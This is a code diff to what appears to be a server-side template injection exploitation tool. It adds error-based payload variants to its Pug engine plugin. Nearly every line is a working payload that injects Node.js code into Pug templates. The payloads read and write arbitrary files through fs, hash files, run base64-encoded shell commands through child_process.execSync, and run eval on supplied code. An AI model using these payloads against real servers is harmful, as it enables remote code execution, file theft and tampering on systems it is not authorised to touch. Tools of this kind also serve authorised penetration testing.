@@ -27,22 +27,30 @@ class Pug(javascript.Javascript):
                 'test_render': f'|#{{typeof({rand.randints[0]})+{rand.randints[1]}}}',
                 'test_render_expected': f'number{rand.randints[1]}'
             },
+            'render_error': {
+                'header': """\n= ''['x'][({header[0]}+{header[1]}).toString()+""",
+                'trailer': """+({trailer[0]}+{trailer[1]}).toString()]\n""",
+            },
             # No evaluate_blind here, since we've no sleep, we'll use inject
             'write': {
                 'call': 'inject',
                 # Payloads calling inject must start with \n to break out already started lines
-                'write': """\n- global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')
-""",
-                'truncate': """\n- global.process.mainModule.require('fs').writeFileSync('{path}', '')
-"""
+                'write': """\n- global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')\n""",
+                'truncate': """\n- global.process.mainModule.require('fs').writeFileSync('{path}', '')\n"""
             },
             'read': {
                 'call': 'render',
                 'read': """= global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
             },
+            'read_error': {
+                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
+            },
             'md5': {
                 'call': 'render',
                 'md5': """= global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
+            },
+            'md5_error': {
+                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
             },
             'blind': {
                 'call': 'execute_blind',
@@ -65,9 +73,15 @@ class Pug(javascript.Javascript):
                 'call': 'render',
                 'execute': """= global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
             },
+            'execute_error': {
+                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
+            },
             'evaluate': {
                 'evaluate': """= eval(Buffer('{code_b64p}', 'base64').toString())""",
                 'test_os': """global.process.mainModule.require('os').platform()"""
+            },
+            'evaluate_error': {
+                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())"""
             },
         })
 
